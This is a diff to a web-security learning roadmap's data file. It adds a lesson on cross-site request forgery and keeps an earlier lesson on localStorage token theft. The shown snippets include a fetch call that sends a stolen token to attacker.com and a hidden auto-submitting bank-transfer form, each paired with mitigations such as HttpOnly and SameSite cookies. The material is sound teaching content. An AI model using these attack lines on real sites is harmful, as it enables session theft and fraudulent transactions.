@@ -373,6 +373,17 @@ export const roadmapNodes: RoadmapNode[] = [
         ],
         codeSnippet: `// Exploit Demonstration of a LocalStorage Token Theft\n// If token is stored in local storage, script can steal it:\nconst stolen = localStorage.getItem("auth_token");\nfetch(\`https://attacker.com/steal?token=\${stolen}\`); // Token compromised!\n\n// If stored in HttpOnly cookie:\nconsole.log(document.cookie); // Returns empty string! Attacker is blocked.`,
         proTip: "Setting HttpOnly doesn't prevent XSS entirely, but it stops the attacker from copying the session token. They can still execute actions using standard fetch calls, but they cannot impersonate the user from other devices."
+      },
+      {
+        title: "8. Security Threats: Cross-Site Request Forgery (CSRF)",
+        description: "Master cross-site request hijacking mechanics and how browser attributes block them.",
+        points: [
+          "CSRF Mechanics: Exploits the browser's default behavior of automatically attaching cookies to matching domains, even if the request originates from an external site.",
+          "Exploit Flow: User is logged into their Bank. User visits a malicious forum page containing a hidden form. The forum triggers an automatic request to the Bank. The browser appends the bank cookie, and the transaction succeeds.",
+          "CSRF Mitigation: Use 'SameSite=Strict' or 'SameSite=Lax' cookie attributes to prevent the browser from automatically sending the cookie from external domains."
+        ],
+        codeSnippet: `// Malicious Site Triggering CSRF:\n// <form action="https://mybank.com/transfer" method="POST">\n//   <input type="hidden" name="amount" value="5000" />\n//   <input type="hidden" name="to" value="attacker_id" />\n// </form>\n// <script>document.forms[0].submit()</script>\n// SameSite=Strict blocks the cookie from attaching here!`,
+        proTip: "Always combine SameSite cookies with CSRF validation tokens (anti-CSRF tokens in form headers) to defend non-cookie APIs."
       }
     ]
   },
